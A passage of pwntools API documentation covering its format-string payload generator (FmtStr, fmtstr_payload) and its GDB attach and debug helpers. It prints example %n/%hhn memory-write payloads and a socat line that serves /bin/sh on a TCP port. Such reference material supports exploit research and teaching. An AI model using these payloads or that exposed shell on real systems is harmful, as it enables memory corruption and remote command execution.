<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>execute_fmt</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; function to call for communicate with the vulnerable process</li>
<li><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the first formatter&#8217;s offset you control</li>
<li><strong>padlen</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; size of the pad you want to add before the payload</li>
<li><strong>numbwritten</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; number of already written bytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>Instantiates an object which try to automating exploit the vulnerable process</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>execute_fmt</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; function to call for communicate with the vulnerable process</li>
<li><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the first formatter&#8217;s offset you control</li>
<li><strong>padlen</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; size of the pad you want to add before the payload</li>
<li><strong>numbwritten</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; number of already written bytes</li>
</ul>
</td>
</tr>
</tbody>
</table>
<dl class="method">
<dt id="pwnlib.fmtstr.FmtStr.execute_writes">
<code class="descname">execute_writes</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; None<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/fmtstr.py#L265-277"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.fmtstr.FmtStr.execute_writes" title="Permalink to this definition">¶</a></dt>
<dd><p>Makes payload and send it to the vulnerable process</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">None</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.fmtstr.FmtStr.write">
<code class="descname">write</code><span class="sig-paren">(</span><em>addr</em>, <em>data</em><span class="sig-paren">)</span> &#x2192; None<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/fmtstr.py#L279-302"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.fmtstr.FmtStr.write" title="Permalink to this definition">¶</a></dt>
<dd><p>In order to tell : I want to write <code class="docutils literal"><span class="pre">data</span></code> at <code class="docutils literal"><span class="pre">addr</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>addr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the address where you want to write</li>
<li><strong>data</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the data that you want to write <code class="docutils literal"><span class="pre">addr</span></code></li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">None</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">def</span> <span class="nf">send_fmt_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
<span class="gp">... </span>    <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="gp">...</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">f</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">send_fmt_payload</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mh">0x08040506</span><span class="p">,</span> <span class="mh">0x1337babe</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">f</span><span class="o">.</span><span class="n">execute_writes</span><span class="p">()</span>
<span class="go">&#39;\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn&#39;</span>
</pre></div>
</div>
</dd></dl>

</dd></dl>

<dl class="function">
<dt id="pwnlib.fmtstr.fmtstr_payload">
<code class="descclassname">pwnlib.fmtstr.</code><code class="descname">fmtstr_payload</code><span class="sig-paren">(</span><em>offset</em>, <em>writes</em>, <em>numbwritten=0</em>, <em>write_size='byte'</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/fmtstr.py#L103-178"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.fmtstr.fmtstr_payload" title="Permalink to this definition">¶</a></dt>
<dd><p>Makes payload with given parameter.
It can generate payload for 32 or 64 bits architectures.
The size of the addr is taken from <code class="docutils literal"><span class="pre">context.bits</span></code></p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; the first formatter&#8217;s offset you control</li>
<li><strong>writes</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; dict with addr, value <code class="docutils literal"><span class="pre">{addr:</span> <span class="pre">value,</span> <span class="pre">addr2:</span> <span class="pre">value2}</span></code></li>
<li><strong>numbwritten</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; number of byte already written by the printf function</li>
<li><strong>write_size</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; must be <code class="docutils literal"><span class="pre">byte</span></code>, <code class="docutils literal"><span class="pre">short</span></code> or <code class="docutils literal"><span class="pre">int</span></code>. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The payload in order to do needed writes</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;int&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;byte&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;int&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00%322419386c%1$n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;short&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">{</span><span class="mh">0x0</span><span class="p">:</span> <span class="mh">0x1337babe</span><span class="p">},</span> <span class="n">write_size</span><span class="o">=</span><span class="s1">&#39;byte&#39;</span><span class="p">))</span>
<span class="go">&#39;\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00%174c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn&#39;</span>
</pre></div>
</div>
</dd></dl>

</div>
</div>
<span id="document-gdb"></span><div class="section" id="module-pwnlib.gdb">
<span id="pwnlib-gdb-working-with-gdb"></span><h3><a class="reference internal" href="#module-pwnlib.gdb" title="pwnlib.gdb"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.gdb</span></code></a> &#8212; Working with GDB<a class="headerlink" href="#module-pwnlib.gdb" title="Permalink to this headline">¶</a></h3>
<p>During exploit development, it is frequently useful to debug the
target binary under GDB.</p>
<p>Pwntools makes this easy-to-do with a handful of helper routines, designed
to make your exploit-debug-update cycles much faster.</p>
<div class="section" id="useful-functions">
<h4>Useful Functions<a class="headerlink" href="#useful-functions" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li><a class="reference internal" href="#pwnlib.gdb.attach" title="pwnlib.gdb.attach"><code class="xref py py-func docutils literal"><span class="pre">attach()</span></code></a> - Attach to an existing process</li>
<li><a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a> - Start a new process under a debugger, stopped at the first instruction</li>
<li><a class="reference internal" href="#pwnlib.gdb.debug_shellcode" title="pwnlib.gdb.debug_shellcode"><code class="xref py py-func docutils literal"><span class="pre">debug_shellcode()</span></code></a> - Build a binary with the provided shellcode, and start it under a debugger</li>
</ul>
</div>
<div class="section" id="debugging-tips">
<h4>Debugging Tips<a class="headerlink" href="#debugging-tips" title="Permalink to this headline">¶</a></h4>
<p>The <a class="reference internal" href="#pwnlib.gdb.attach" title="pwnlib.gdb.attach"><code class="xref py py-func docutils literal"><span class="pre">attach()</span></code></a> and <a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a> functions will likely be your bread and
butter for debugging.</p>
<p>Both allow you to provide a script to pass to GDB when it is started, so that
it can automatically set your breakpoints.</p>
<div class="section" id="attaching-to-processes">
<h5>Attaching to Processes<a class="headerlink" href="#attaching-to-processes" title="Permalink to this headline">¶</a></h5>
<p>To attach to an existing process, just use <a class="reference internal" href="#pwnlib.gdb.attach" title="pwnlib.gdb.attach"><code class="xref py py-func docutils literal"><span class="pre">attach()</span></code></a>.  It is surprisingly
versatile, and can attach to a <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a> for simple
binaries, or will automatically find the correct process to attach to for a
forking server, if given a <a class="reference internal" href="index.html#pwnlib.tubes.remote.remote" title="pwnlib.tubes.remote.remote"><code class="xref py py-class docutils literal"><span class="pre">remote</span></code></a> object.</p>
</div>
<div class="section" id="spawning-new-processes">
<h5>Spawning New Processes<a class="headerlink" href="#spawning-new-processes" title="Permalink to this headline">¶</a></h5>
<p>Attaching to processes with <a class="reference internal" href="#pwnlib.gdb.attach" title="pwnlib.gdb.attach"><code class="xref py py-func docutils literal"><span class="pre">attach()</span></code></a> is useful, but the state the process
is in may vary.  If you need to attach to a process very early, and debug it from
the very first instruction (or even the start of <code class="docutils literal"><span class="pre">main</span></code>), you instead should use
<a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a>.</p>
<p>When you use <a class="reference internal" href="#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">debug()</span></code></a>, the return value is a <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">tube</span></code></a> object
that you interact with exactly like normal.</p>
</div>
</div>
<div class="section" id="tips-and-troubleshooting">
<h4>Tips and Troubleshooting<a class="headerlink" href="#tips-and-troubleshooting" title="Permalink to this headline">¶</a></h4>
<div class="section" id="noptrace-magic-argument">
<h5><code class="docutils literal"><span class="pre">NOPTRACE</span></code> magic argument<a class="headerlink" href="#noptrace-magic-argument" title="Permalink to this headline">¶</a></h5>
<p>It&#8217;s quite cumbersom to comment and un-comment lines containing <cite>attach</cite>.</p>
<p>You can cause these lines to be a no-op by running your script with the
<code class="docutils literal"><span class="pre">NOPTRACE</span></code> argument appended, or with <code class="docutils literal"><span class="pre">PWNLIB_NOPTRACE=1</span></code> in the environment.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$ python exploit.py NOPTRACE
[+] Starting local process &#39;/bin/bash&#39;: Done
[!] Skipping debug attach since context.noptrace==True
...
</pre></div>
</div>
</div>
<div class="section" id="kernel-yama-ptrace-scope">
<h5>Kernel Yama ptrace_scope<a class="headerlink" href="#kernel-yama-ptrace-scope" title="Permalink to this headline">¶</a></h5>
<p>The Linux kernel v3.4 introduced a security mechanism called <code class="docutils literal"><span class="pre">ptrace_scope</span></code>,
which is intended to prevent processes from debugging eachother unless there is
a direct parent-child relationship.</p>
<p>This causes some issues with the normal Pwntools workflow, since the process
heirarchy looks like this:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>python ---&gt; target
       `--&gt; gdb
</pre></div>
</div>
<p>Note that <code class="docutils literal"><span class="pre">python</span></code> is the parent of <code class="docutils literal"><span class="pre">target</span></code>, not <code class="docutils literal"><span class="pre">gdb</span></code>.</p>
<p>In order to avoid this being a problem, Pwntools uses the function
<code class="docutils literal"><span class="pre">prctl(PR_SET_PTRACER,</span> <span class="pre">PR_SET_PTRACER_ANY)</span></code>.  This disables Yama
for any processes launched by Pwntools via <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a> or via
<a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh.process" title="pwnlib.tubes.ssh.ssh.process"><code class="xref py py-meth docutils literal"><span class="pre">ssh.process()</span></code></a>.</p>
<p>Older versions of Pwntools did not perform the <code class="docutils literal"><span class="pre">prctl</span></code> step, and
required that the Yama security feature was disabled systemwide, which
requires <code class="docutils literal"><span class="pre">root</span></code> access.</p>
<div class="section" id="member-documentation">
<h6>Member Documentation<a class="headerlink" href="#member-documentation" title="Permalink to this headline">¶</a></h6>
<dl class="function">
<dt id="pwnlib.gdb.attach">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">attach</code><span class="sig-paren">(</span><em>target</em>, <em>gdbscript = None</em>, <em>exe = None</em>, <em>arch = None</em>, <em>ssh = None</em><span class="sig-paren">)</span> &#x2192; None<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.attach" title="Permalink to this definition">¶</a></dt>
<dd><p>Start GDB in a new terminal and attach to <cite>target</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>target</strong> &#8211; The target to attach to.</li>
<li><strong>gdbscript</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-obj docutils literal"><span class="pre">str</span></code></a> or <a class="reference external" href="https://docs.python.org/2.7/library/functions.html#file" title="(in Python v2.7)"><code class="xref py py-obj docutils literal"><span class="pre">file</span></code></a>) &#8211; GDB script to run after attaching.</li>
<li><strong>exe</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; The path of the target binary.</li>
<li><strong>arch</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Architechture of the target binary.  If <cite>exe</cite> known GDB will
detect the architechture automatically (if it is supported).</li>
<li><strong>gdb_args</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of additional arguments to pass to GDB.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">PID of the GDB process (or the window which it is running in).</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Notes</p>
<p>The <code class="docutils literal"><span class="pre">target</span></code> argument is very robust, and can be any of the following:</p>
<dl class="docutils">
<dt><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><code class="xref py py-obj docutils literal"><span class="pre">int</span></code></a></dt>
<dd>PID of a process</dd>
<dt><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-obj docutils literal"><span class="pre">str</span></code></a></dt>
<dd>Process name.  The youngest process is selected.</dd>
<dt><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#tuple" title="(in Python v2.7)"><code class="xref py py-obj docutils literal"><span class="pre">tuple</span></code></a></dt>
<dd>Host, port pair of a listening <code class="docutils literal"><span class="pre">gdbserver</span></code></dd>
<dt><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a></dt>
<dd>Process to connect to</dd>
<dt><a class="reference internal" href="index.html#pwnlib.tubes.sock.sock" title="pwnlib.tubes.sock.sock"><code class="xref py py-class docutils literal"><span class="pre">sock</span></code></a></dt>
<dd>Connected socket. The executable on the other end of the connection is attached to.
Can be any socket type, including <a class="reference internal" href="index.html#pwnlib.tubes.listen.listen" title="pwnlib.tubes.listen.listen"><code class="xref py py-class docutils literal"><span class="pre">listen</span></code></a> or <a class="reference internal" href="index.html#pwnlib.tubes.remote.remote" title="pwnlib.tubes.remote.remote"><code class="xref py py-class docutils literal"><span class="pre">remote</span></code></a>.</dd>
<dt><a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh_channel" title="pwnlib.tubes.ssh.ssh_channel"><code class="xref py py-class docutils literal"><span class="pre">ssh_channel</span></code></a></dt>
<dd>Remote process spawned via <a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh.process" title="pwnlib.tubes.ssh.ssh.process"><code class="xref py py-meth docutils literal"><span class="pre">ssh.process()</span></code></a>.
This will use the GDB installed on the remote machine.
If a password is required to connect, the <code class="docutils literal"><span class="pre">sshpass</span></code> program must be installed.</dd>
</dl>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Attach directly to pid 1234</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="mi">1234</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Attach to the youngest &quot;bash&quot; process</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Start a process</span>
<span class="n">bash</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">)</span>

<span class="c1"># Attach the debugger</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">bash</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">set follow-fork-mode child</span>
<span class="s1">break execve</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>

<span class="c1"># Interact with the process</span>
<span class="n">bash</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Start a forking server</span>
<span class="n">server</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;socat&#39;</span><span class="p">,</span> <span class="s1">&#39;tcp-listen:1234,fork,reuseaddr&#39;</span><span class="p">,</span> <span class="s1">&#39;exec:/bin/sh&#39;</span><span class="p">])</span>

<span class="c1"># Connect to the server</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">)</span>

<span class="c1"># Connect the debugger to the server-spawned process</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">break exit</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>

<span class="c1"># Talk to the spawned &#39;sh&#39;</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;exit&#39;</span><span class="p">)</span>
</pre></div>
</div>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="c1"># Connect to the SSH server</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="s1">&#39;bandit.labs.overthewire.org&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;bandit0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">2220</span><span class="p">)</span>

<span class="c1"># Start a process on the server</span>
<span class="n">cat</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">])</span>

<span class="c1"># Attach a debugger to it</span>
<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">cat</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
<span class="s1">break exit</span>
<span class="s1">continue</span>
<span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>

<span class="c1"># Cause `cat` to exit</span>
<span class="n">cat</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.binary">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">binary</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L423-443"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.binary" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body"><em>str</em> &#8211; Path to the appropriate <code class="docutils literal"><span class="pre">gdb</span></code> binary to use.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.corefile">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">corefile</code><span class="sig-paren">(</span><em>process</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L850-890"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.corefile" title="Permalink to this definition">¶</a></dt>
<dd><p>Drops a core file for the process.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>process</strong> &#8211; Process to dump</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><code class="xref py py-class docutils literal"><span class="pre">Core</span></code> &#8211; The generated core file</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.gdb.debug">
<code class="descclassname">pwnlib.gdb.</code><code class="descname">debug</code><span class="sig-paren">(</span><em>args</em><span class="sig-paren">)</span> &#x2192; tube<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/gdb.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.gdb.debug" title="Permalink to this definition">¶</a></dt>
<dd><p>Launch a GDB server with the specified command line,
and launches GDB to attach to it.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>args</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; Arguments to the process, similar to <a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a>.</li>
<li><strong>gdbscript</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; GDB script to run.</li>
<li><strong>exe</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the executable on disk</li>
<li><strong>env</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Environment to start the binary in</li>
<li><strong>ssh</strong> (<a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh" title="pwnlib.tubes.ssh.ssh"><code class="xref py py-class docutils literal"><span class="pre">ssh</span></code></a>) &#8211; Remote ssh session to use to launch the process.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#pwnlib.tubes.process.process" title="pwnlib.tubes.process.process"><code class="xref py py-class docutils literal"><span class="pre">process</span></code></a> or <a class="reference internal" href="index.html#pwnlib.tubes.ssh.ssh_channel" title="pwnlib.tubes.ssh.ssh_channel"><code class="xref py py-class docutils literal"><span class="pre">ssh_channel</span></code></a> &#8211; A tube connected to the target process</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Notes</p>
<p>The debugger is attached automatically, and you can debug everything
from the very beginning.  This requires that both <code class="docutils literal"><span class="pre">gdb</span></code> and <code class="docutils literal"><span class="pre">gdbserver</span></code>
